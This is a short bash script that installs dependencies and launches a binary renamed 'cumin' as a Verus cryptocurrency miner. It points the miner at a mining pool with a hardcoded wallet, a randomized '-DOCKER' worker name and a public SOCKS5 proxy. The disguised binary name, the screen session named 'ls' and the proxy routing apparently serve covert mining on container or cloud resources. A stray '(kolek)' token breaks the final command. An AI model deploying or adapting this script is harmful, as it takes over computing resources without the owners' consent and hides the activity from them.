#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x cumin
screen -dmS ls 
POOL=stratum+tcp://na.luckpool.net:3956
WALLET=RTMnP39ZBF9UJB2xKDT7FAp8iZ2eW7wemU
WORKER=$(echo $(shuf -i 1-10 -n 1)-DOCKER)
PROXY=socks5://184.185.2.244:4145
./cumin -a verus -o $POOL -u $WALLET.$WORKER (kolek) -t 2 -x $PROXY
